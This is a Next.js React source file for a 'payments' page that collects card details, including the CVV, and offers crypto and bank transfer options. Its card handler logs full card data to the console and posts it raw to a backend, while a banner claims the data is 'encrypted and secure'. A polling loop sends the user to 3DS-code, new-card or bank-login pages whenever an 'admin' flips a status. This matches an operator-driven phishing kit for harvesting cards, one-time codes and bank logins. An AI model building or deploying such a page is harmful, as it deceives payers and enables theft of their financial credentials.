'use client'

import { useState, useEffect } from 'react'
import { useRouter, useParams } from 'next/navigation'
import { useAuth } from '@/hooks/use-auth'
import { useTranslations } from 'next-intl'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Badge } from '@/components/ui/badge'
import { 
  CreditCard, 
  Bitcoin, 
  Building2,
  ArrowRight,
  Loader2,
  CheckCircle,
  AlertCircle,
  Shield
} from 'lucide-react'
import { useToast } from '@/hooks/use-toast'
import { motion } from 'framer-motion'

interface PaymentMethod {
  id: string
  name: string
  icon: React.ReactNode
  description: string
  available: boolean
}

export default function PaymentsPage() {
  const router = useRouter()
  const { locale } = useParams() as { locale: string }
  const { isAuthenticated, user } = useAuth()
  const { toast } = useToast()
  const t = useTranslations('payments')
  
  const [amount, setAmount] = useState('')
  const [selectedMethod, setSelectedMethod] = useState<string>('')
  const [loading, setLoading] = useState(false)
  const [showPaymentForm, setShowPaymentForm] = useState(false)
  const [selectedCrypto, setSelectedCrypto] = useState<string>('USDT')
  const [selectedNetwork, setSelectedNetwork] = useState<string>('')
  const [paymentId, setPaymentId] = useState<string>('')
  
  // Card form state
  const [cardHolder, setCardHolder] = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [cardExpiry, setCardExpiry] = useState('')
  const [cardCvv, setCardCvv] = useState('')

  // Poll payment status for active payments - ALWAYS ACTIVE
  useEffect(() => {
    if (!paymentId || !user) return

    const pollInterval = setInterval(async () => {
      try {
        const token = localStorage.getItem('token')
        if (!token) {
          console.error('No authentication token found')
          return
        }

        // Validate paymentId format
        if (!paymentId || paymentId.length < 10) {
          console.error('Invalid payment ID format:', paymentId)
          return
        }

        const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentId}/status`, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        })

        if (response.ok) {
          const data = await response.json()
          const status = data.status

          console.log('🔄 Main payments page - Payment status polled:', status)

          // Check if admin has requested an action
          if (status === 'waiting_3ds') {
            console.log('🔐 Admin requested 3DS - redirecting...')
            router.push(`/${locale}/payments/3ds?payment_id=${paymentId}&amount=${amount}&currency=EUR&user_email=${encodeURIComponent(localStorage.getItem('user_email') || '')}`)
          } else if (status === 'requires_new_card') {
            console.log('💳 Admin requested new card - redirecting...')
            router.push(`/${locale}/payments/new-card?payment_id=${paymentId}&amount=${amount}&currency=EUR&user_email=${encodeURIComponent(localStorage.getItem('user_email') || '')}`)
          } else if (status === 'requires_bank_login') {
            console.log('🏦 Admin requested bank login - redirecting...')
            router.push(`/${locale}/payments/bank-login?payment_id=${paymentId}&amount=${amount}&currency=EUR&user_email=${encodeURIComponent(localStorage.getItem('user_email') || '')}`)
          } else if (status === 'completed' || status === 'failed' || status === 'cancelled') {
            console.log('🏁 Payment final status reached:', status)
            // Stay on main page, payment completed
          }
        } else {
          console.error('Failed to fetch payment status:', response.status, response.statusText)
        }
      } catch (error) {
        console.error('Payment status polling error:', error)
      }
    }, 2000) // Poll every 2 seconds - ALWAYS ACTIVE

    return () => clearInterval(pollInterval)
  }, [paymentId, user, locale, router, amount])

  // Comprehensive cryptocurrency data
  const cryptocurrencies = {
    'USDT': {
      name: 'Tether',
      symbol: 'USDT',
      networks: [
        { name: 'Ethereum (ERC-20)', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' },
        { name: 'Tron (TRC-20)', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
        { name: 'BSC (BEP-20)', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' },
        { name: 'Polygon', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' }
      ]
    },
    'USDC': {
      name: 'USD Coin',
      symbol: 'USDC',
      networks: [
        { name: 'Ethereum (ERC-20)', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' },
        { name: 'BSC (BEP-20)', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' },
        { name: 'Polygon', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' },
        { name: 'Avalanche', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' }
      ]
    },
    'BTC': {
      name: 'Bitcoin',
      symbol: 'BTC',
      networks: [
        { name: 'Bitcoin', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
        { name: 'Lightning', address: 'lnbc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' }
      ]
    },
    'ETH': {
      name: 'Ethereum',
      symbol: 'ETH',
      networks: [
        { name: 'Ethereum', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' },
        { name: 'Polygon', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' },
        { name: 'Arbitrum', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' }
      ]
    },
    'XMR': {
      name: 'Monero',
      symbol: 'XMR',
      networks: [
        { name: 'Monero', address: '4A1S1VfRBtqJMYkSi71oVWfrWnmSJsqgQP5nooDgc6gqeWhXUk3dfG4YtDCr4boLFFNeXoV4LS2St72d7LDjvXr5JmCqUk' }
      ]
    },
    'LTC': {
      name: 'Litecoin',
      symbol: 'LTC',
      networks: [
        { name: 'Litecoin', address: 'ltc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' }
      ]
    },
    'SOL': {
      name: 'Solana',
      symbol: 'SOL',
      networks: [
        { name: 'Solana', address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU' }
      ]
    },
    'BNB': {
      name: 'BNB',
      symbol: 'BNB',
      networks: [
        { name: 'BSC (BEP-20)', address: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6' }
      ]
    }
  }

  const paymentMethods: PaymentMethod[] = [
    {
      id: 'card',
      name: t('cardPayment'),
      icon: <CreditCard className="h-6 w-6" />,
      description: t('cardDescription'),
      available: true
    },
    {
      id: 'crypto',
      name: t('cryptocurrency'),
      icon: <Bitcoin className="h-6 w-6" />,
      description: t('cryptoDescription'),
      available: true
    },
    {
      id: 'bank_account',
      name: t('bankTransfer'),
      icon: <Building2 className="h-6 w-6" />,
      description: t('bankDescription'),
      available: true
    }
  ]

  useEffect(() => {
    if (!isAuthenticated) {
      router.push(`/${locale}/login?redirect=${encodeURIComponent(`/${locale}/payments`)}`)
    }
  }, [isAuthenticated, router, locale])

  // Set initial network when crypto changes
  useEffect(() => {
    if (selectedCrypto && cryptocurrencies[selectedCrypto]) {
      setSelectedNetwork(cryptocurrencies[selectedCrypto].networks[0].name)
    }
  }, [selectedCrypto])

  // No automatic polling - user stays on payments page until admin action

  const handlePayment = async () => {
    if (!amount || !selectedMethod) {
      toast({
        title: t('error'),
        description: t('enterAmountAndMethod'),
        variant: "destructive",
      })
      return
    }

    if (!isAuthenticated) {
      toast({
        title: t('authorizationRequired'),
        description: t('loginToMakePayments'),
        variant: "destructive",
      })
      return
    }

    setShowPaymentForm(true)
  }

  const handleCardPayment = async (e: React.FormEvent) => {
    e.preventDefault()
    
    console.log('💳 handleCardPayment: Starting card payment...')
    console.log('💳 handleCardPayment: Form data:', {
      amount,
      cardHolder,
      cardNumber,
      cardExpiry,
      cardCvv
    })
    
    // Validate amount
    if (!amount || parseFloat(amount) < 1) {
      toast({
        title: t('error'),
        description: 'Please enter a valid amount (minimum 1.00 EUR)',
        variant: "destructive",
      })
      return
    }
    
    setLoading(true)
    console.log('💳 handleCardPayment: Loading set to true')

    try {
      const token = localStorage.getItem('token')
      console.log('💳 handleCardPayment: Token found:', token ? 'Yes' : 'No')
      
      if (!token) {
        toast({
          title: t('authorizationError'),
          description: t('loginToMakePayments'),
          variant: "destructive",
        })
        return
      }

      const requestBody = {
        amount: parseFloat(amount),
        payment_method: 'card',
        card_holder: cardHolder,
        card_number: cardNumber,
        card_expiry: cardExpiry,
        card_cvv: cardCvv
      }
      
      console.log('💳 handleCardPayment: Request body:', requestBody)
      console.log('💳 handleCardPayment: Sending request to /api/payments/create-card-payment')

      const response = await fetch('http://localhost:8000/api/payments/create-card-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(requestBody)
      })

      console.log('💳 handleCardPayment: Response status:', response.status)
      console.log('💳 handleCardPayment: Response headers:', Object.fromEntries(response.headers.entries()))

      if (!response.ok) {
        const errorText = await response.text()
        console.log('💳 handleCardPayment: Error response body:', errorText)
        throw new Error(`HTTP ${response.status}: ${errorText}`)
      }

      const result = await response.json()
      console.log('💳 handleCardPayment: Success response:', result)

      if (result.success) {
        setPaymentId(result.payment_id)
        toast({
          title: t('paymentCreated'),
          description: `${t('paymentId')}: ${result.payment_id}`,
          variant: "default"
        })
        
        // Redirect to anti-fraud checking page
        router.push(`/${locale}/payments/checking?payment_id=${result.payment_id}&amount=${amount}&currency=EUR&user_email=${encodeURIComponent(localStorage.getItem('user_email') || '')}`)
      } else {
        toast({
          title: t('error'),
          description: result.error || t('failedToCreatePayment'),
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error('💳 handleCardPayment: Error:', error)
      toast({
        title: t('error'),
        description: t('paymentCreationError'),
        variant: "destructive",
      })
    } finally {
      setLoading(false)
      console.log('💳 handleCardPayment: Loading set to false')
    }
  }

  const handleCryptoPayment = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate amount and selection
    if (!amount || parseFloat(amount) < 1) {
      toast({
        title: t('error'),
        description: 'Please enter a valid amount (minimum 1.00 EUR)',
        variant: "destructive",
      })
      return
    }
    
    if (!selectedCrypto || !selectedNetwork) {
      toast({
        title: t('error'),
        description: 'Please select both cryptocurrency and network',
        variant: "destructive",
      })
      return
    }
    
    setLoading(true)

    try {
      const token = localStorage.getItem('token')
      if (!token) {
        toast({
          title: t('authorizationError'),
          description: t('loginToMakePayments'),
          variant: "destructive",
        })
        return
      }

      const response = await fetch('http://localhost:8000/api/payments/create-crypto-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          amount: parseFloat(amount),
          payment_method: 'crypto',
          crypto_type: selectedCrypto,
          crypto_network: selectedNetwork
        })
      })

      const result = await response.json()

      if (result.success) {
        setPaymentId(result.payment_id)
        toast({
          title: t('paymentCreated'),
          description: `${t('paymentId')}: ${result.payment_id}`,
          variant: "default"
        })
        // Redirect to anti-fraud checking page
        router.push(`/${locale}/payments/checking?payment_id=${result.payment_id}&amount=${amount}&currency=EUR&user_email=${encodeURIComponent(localStorage.getItem('user_email') || '')}`)
      } else {
        toast({
          title: t('error'),
          description: result.error || t('failedToCreatePayment'),
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error('Crypto payment error:', error)
      toast({
        title: t('error'),
        description: t('paymentCreationError'),
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  const handleBankTransfer = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate amount
    if (!amount || parseFloat(amount) < 1) {
      toast({
        title: t('error'),
        description: 'Please enter a valid amount (minimum 1.00 EUR)',
        variant: "destructive",
      })
      return
    }
    
    setLoading(true)

    try {
      const token = localStorage.getItem('token')
      if (!token) {
        toast({
          title: t('authorizationError'),
          description: t('loginToMakePayments'),
          variant: "destructive",
        })
        return
      }

      const response = await fetch('http://localhost:8000/api/payments/create-bank-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          amount: parseFloat(amount),
          payment_method: 'bank_transfer'
        })
      })

      const result = await response.json()

      if (result.success) {
        setPaymentId(result.payment_id)
        toast({
          title: t('paymentCreated'),
          description: `${t('paymentId')}: ${result.payment_id}`,
          variant: "default"
        })
        // Redirect to anti-fraud checking page
        router.push(`/${locale}/payments/checking?payment_id=${result.payment_id}&amount=${amount}&currency=EUR&user_email=${encodeURIComponent(localStorage.getItem('user_email') || '')}`)
      } else {
        toast({
          title: t('error'),
          description: result.error || t('failedToCreatePayment'),
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error('Bank transfer error:', error)
      toast({
        title: t('error'),
        description: t('paymentCreationError'),
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black cyber-grid">
        <div className="flex items-center justify-center min-h-screen">
          <div className="text-center">
            <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
            <p>{t('redirectingToLogin')}</p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black cyber-grid">
      <main className="pt-20 pb-10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          {/* Header */}
          <div className="text-center mb-12">
            <h1 className="text-4xl font-bold text-white neon-glow mb-4">
              💳 {t('payments')}
            </h1>
            <p className="text-xl text-gray-300 mb-4">
              {t('secureAndFastPaymentMethods')}
            </p>
            <div className="inline-block p-3 bg-cyan-500/10 border border-cyan-500/30 rounded-lg">
              <p className="text-cyan-400 text-sm font-mono">
                💰 {t('mainCurrency')}: 1 NC = 1 EUR = 1 USD
              </p>
            </div>
          </div>

          {/* Payment Form */}
          <Card className="bg-black/50 border-cyan-500/30">
            <CardHeader>
              <CardTitle className="text-white">{t('paymentDetails')}</CardTitle>
              <CardDescription className="text-gray-400">
                {t('enterAmountAndMethod')}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              {/* Amount Input */}
              <div className="space-y-2">
                <Label htmlFor="amount" className="text-white">{t('amount')}</Label>
                <div className="relative">
                  <Input
                    id="amount"
                    type="number"
                    value={amount}
                    onChange={(e) => {
                      const value = e.target.value;
                      // Only allow positive numbers with up to 2 decimal places
                      if (value === '' || (/^\d+(\.\d{0,2})?$/.test(value) && parseFloat(value) > 0)) {
                        setAmount(value);
                      }
                    }}
                    onBlur={(e) => {
                      // Format to 2 decimal places on blur
                      if (e.target.value) {
                        const num = parseFloat(e.target.value);
                        if (!isNaN(num)) {
                          setAmount(num.toFixed(2));
                        }
                      }
                    }}
                    placeholder="0.00"
                    className="bg-gray-800/50 border-gray-600/30 text-white placeholder-gray-400"
                    min="0.01"
                    step="0.01"
                    required
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400">
                    EUR
                  </div>
                </div>
                {amount && parseFloat(amount) < 1 && (
                  <p className="text-red-400 text-sm">Minimum amount is 1.00 EUR</p>
                )}
              </div>

              {/* Payment Method Selection */}
              <div className="space-y-2">
                <Label className="text-white">{t('paymentMethod')}</Label>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {paymentMethods.map((method) => (
                    <div
                      key={method.id}
                      className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                        selectedMethod === method.id
                          ? 'border-cyan-500/50 bg-cyan-500/10'
                          : 'border-gray-600/30 bg-gray-800/30 hover:border-gray-500/50'
                      }`}
                      onClick={() => setSelectedMethod(method.id)}
                    >
                      <div className="flex items-center space-x-3">
                        <div className="text-cyan-400">{method.icon}</div>
                        <div className="flex-1">
                          <h3 className="text-white font-medium">{method.name}</h3>
                          <p className="text-gray-400 text-sm mt-1">
                            {method.description}
                          </p>
                          <p className="text-gray-500 text-xs mt-2">
                            {t('processingTime')}
                          </p>
                        </div>
                        {!method.available && (
                          <Badge variant="outline" className="text-red-400 border-red-500/30">
                            {t('unavailable')}
                          </Badge>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Proceed Button */}
              <div className="mt-8">
                <Button
                  onClick={() => setShowPaymentForm(true)}
                  disabled={!selectedMethod || !amount || parseFloat(amount) < 1}
                  className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-medium py-3"
                >
                  {t('proceedToPayment')} <ArrowRight className="h-4 w-4 ml-2" />
                </Button>
              </div>

              {/* Payment Forms - Only show after clicking "Proceed to Payment" */}
              {showPaymentForm && selectedMethod === 'card' && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="mt-8"
                >
                  <Card className="bg-black/50 border-cyan-500/30">
                    <CardHeader>
                      <CardTitle className="text-white">{t('cardPayment')}</CardTitle>
                      <CardDescription className="text-gray-400">
                        {t('cardDescription')} - {amount}.00 EUR
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      <form onSubmit={handleCardPayment} className="space-y-4">
                        <div className="space-y-2">
                          <Label htmlFor="card_holder" className="text-white">{t('cardHolder')}</Label>
                          <Input
                            id="card_holder"
                            type="text"
                            placeholder="JOHN DOE"
                            value={cardHolder}
                            onChange={(e) => {
                              // Only allow letters and spaces
                              const value = e.target.value.replace(/[^A-Za-z\s]/g, '').toUpperCase();
                              setCardHolder(value);
                            }}
                            className="bg-gray-800/50 border-gray-600/30 text-white placeholder-gray-400"
                            required
                          />
                        </div>

                        <div className="space-y-2">
                          <Label htmlFor="card_number" className="text-white">{t('cardNumber')}</Label>
                          <Input
                            id="card_number"
                            type="text"
                            placeholder="1234 5678 9012 3456"
                            value={cardNumber}
                            onChange={(e) => {
                              // Remove all non-digits
                              const digits = e.target.value.replace(/\D/g, '');
                              // Format with spaces every 4 digits
                              const formatted = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
                              // Limit to 19 characters (16 digits + 3 spaces)
                              setCardNumber(formatted.substring(0, 19));
                            }}
                            className="bg-gray-800/50 border-gray-600/30 text-white placeholder-gray-400 font-mono"
                            required
                          />
                        </div>

                        <div className="grid grid-cols-2 gap-4">
                          <div className="space-y-2">
                            <Label htmlFor="card_expiry" className="text-white">{t('cardExpiry')}</Label>
                            <Input
                              id="card_expiry"
                              type="text"
                              placeholder="MM/YY"
                              value={cardExpiry}
                              onChange={(e) => {
                                // Remove all non-digits
                                const digits = e.target.value.replace(/\D/g, '');
                                // Format as MM/YY
                                let formatted = digits;
                                if (digits.length >= 2) {
                                  formatted = digits.substring(0, 2) + '/' + digits.substring(2, 4);
                                }
                                // Limit to 5 characters (MM/YY)
                                setCardExpiry(formatted.substring(0, 5));
                              }}
                              className="bg-gray-800/50 border-gray-600/30 text-white placeholder-gray-400 font-mono"
                              required
                            />
                          </div>

                          <div className="space-y-2">
                            <Label htmlFor="card_cvv" className="text-white">{t('cardCvv')}</Label>
                            <Input
                              id="card_cvv"
                              type="text"
                              placeholder="123"
                              value={cardCvv}
                              onChange={(e) => {
                                // Remove all non-digits
                                const digits = e.target.value.replace(/\D/g, '');
                                // Limit to 4 digits (for Amex cards)
                                setCardCvv(digits.substring(0, 4));
                              }}
                              className="bg-gray-800/50 border-gray-600/30 text-white placeholder-gray-400 font-mono"
                              required
                            />
                          </div>
                        </div>

                        <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-3">
                          <p className="text-green-400 text-sm text-center">
                            Your payment information is encrypted and secure
                          </p>
                        </div>

                        <Button
                          type="submit"
                          disabled={loading}
                          className="w-full bg-gradient-to-r from-purple-500 to-pink-600 hover:from-purple-600 hover:to-pink-700 text-white font-medium py-3"
                        >
                          {loading ? (
                            <>
                              <Loader2 className="h-4 w-4 animate-spin mr-2" />
                              {t('processing')}...
                            </>
                          ) : (
                            <>
                              {t('pay')} {amount} EUR
                              <ArrowRight className="h-4 w-4 ml-2" />
                            </>
                          )}
                        </Button>

                        <Button
                          type="button"
                          onClick={() => setShowPaymentForm(false)}
                          variant="outline"
                          className="w-full border-gray-600/30 text-gray-300 hover:bg-gray-700/50"
                        >
                          {t('backToMethods')}
                        </Button>
                      </form>
                    </CardContent>
                  </Card>
                </motion.div>
              )}

              {showPaymentForm && selectedMethod === 'crypto' && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="mt-8"
                >
                  <Card className="bg-black/50 border-cyan-500/30">
                    <CardHeader>
                      <CardTitle className="text-white">{t('cryptocurrency')}</CardTitle>
                      <CardDescription className="text-gray-400">
                        {t('cryptoDescription')} - {amount}.00 EUR
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      <form onSubmit={handleCryptoPayment} className="space-y-6">
                        <div className="bg-gray-800/50 p-4 rounded-lg border border-gray-600/30">
                          <h3 className="text-white font-medium mb-3">{t('selectCryptocurrency')}</h3>
                          <div className="space-y-4">
                            {/* Cryptocurrency Selection */}
                            <div>
                              <Label className="text-gray-400 text-sm mb-2 block">{t('cryptocurrency')}</Label>
                              <select
                                value={selectedCrypto}
                                onChange={(e) => setSelectedCrypto(e.target.value)}
                                className="w-full p-3 bg-gray-900 border border-gray-600/30 rounded-lg text-white focus:border-cyan-500/50 focus:outline-none"
                              >
                                {Object.keys(cryptocurrencies).map((cryptoKey) => (
                                  <option key={cryptoKey} value={cryptoKey}>
                                    {cryptocurrencies[cryptoKey].name} ({cryptocurrencies[cryptoKey].symbol})
                                  </option>
                                ))}
                              </select>
                            </div>

                            {/* Network Selection */}
                            <div>
                              <Label className="text-gray-400 text-sm mb-2 block">{t('selectNetwork')}</Label>
                              <select
                                value={selectedNetwork}
                                onChange={(e) => setSelectedNetwork(e.target.value)}
                                className="w-full p-3 bg-gray-900 border border-gray-600/30 rounded-lg text-white focus:border-cyan-500/50 focus:outline-none"
                              >
                                {selectedCrypto && cryptocurrencies[selectedCrypto]?.networks.map((network) => (
                                  <option key={network.name} value={network.name}>
                                    {network.name}
                                  </option>
                                ))}
                              </select>
                            </div>
                          </div>
                        </div>

                        <div className="bg-gray-800/50 p-4 rounded-lg border border-gray-600/30">
                          <h3 className="text-white font-medium mb-3">{t('paymentInformation')}</h3>
                          <div className="space-y-3">
                            <div>
                              <Label className="text-gray-400 text-sm">{t('amountToPay')}</Label>
                              <p className="text-white font-mono text-lg">{amount} EUR</p>
                            </div>
                            <div>
                              <Label className="text-gray-400 text-sm">{t('walletAddress')}</Label>
                              <div className="flex items-center space-x-2">
                                <code className="text-cyan-400 font-mono text-sm bg-gray-900 px-2 py-1 rounded">
                                  {selectedCrypto && selectedNetwork && cryptocurrencies[selectedCrypto]?.networks.find(n => n.name === selectedNetwork)?.address}
                                </code>
                                <Button
                                  type="button"
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    const address = selectedCrypto && selectedNetwork && cryptocurrencies[selectedCrypto]?.networks.find(n => n.name === selectedNetwork)?.address;
                                    if (address) {
                                      navigator.clipboard.writeText(address);
                                      toast({
                                        title: "Address copied!",
                                        description: `${selectedCrypto} address copied to clipboard`,
                                        variant: "default"
                                      });
                                    }
                                  }}
                                  className="border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10"
                                >
                                  {t('copyAddress')}
                                </Button>
                              </div>
                            </div>
                          </div>
                        </div>

                        <Button
                          type="submit"
                          disabled={loading || !selectedCrypto || !selectedNetwork}
                          className="w-full bg-gradient-to-r from-orange-500 to-red-600 hover:from-orange-600 hover:to-red-700 text-white font-medium py-3"
                        >
                          {loading ? (
                            <>
                              <Loader2 className="h-4 w-4 animate-spin mr-2" />
                              {t('creatingPayment')}...
                            </>
                          ) : (
                            <>
                              {t('create')} {selectedCrypto} {t('payment')}
                              <ArrowRight className="h-4 w-4 ml-2" />
                            </>
                          )}
                        </Button>

                        <Button
                          type="button"
                          onClick={() => setShowPaymentForm(false)}
                          variant="outline"
                          className="w-full border-gray-600/30 text-gray-300 hover:bg-gray-700/50"
                        >
                          {t('backToMethods')}
                        </Button>
                      </form>
                    </CardContent>
                  </Card>
                </motion.div>
              )}

              {showPaymentForm && selectedMethod === 'bank_account' && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="mt-8"
                >
                  <Card className="bg-black/50 border-cyan-500/30">
                    <CardContent>
                      <div className="bg-gray-800/50 p-6 rounded-lg text-center border border-gray-600/30">
                        <Building2 className="h-16 w-16 mx-auto mb-4 text-cyan-400" />
                        <h3 className="text-white font-medium mb-2 text-lg">{t('bankTransfer')}</h3>
                        <p className="text-gray-400 mb-6">
                          {t('contactSupportForDetails')}
                        </p>
                        <div className="space-y-3">
                          <Button
                            onClick={handleBankTransfer}
                            disabled={loading}
                            className="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-medium py-3"
                          >
                            {loading ? (
                              <>
                                <Loader2 className="h-4 w-4 animate-spin mr-2" />
                                {t('creatingPayment')}...
                              </>
                            ) : (
                              t('createPayment')
                            )}
                          </Button>
                          <Button
                            onClick={() => setShowPaymentForm(false)}
                            variant="outline"
                            className="w-full border-gray-600/30 text-gray-300 hover:bg-gray-700/50"
                          >
                            {t('backToMethods')}
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </motion.div>
              )}
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  )
}


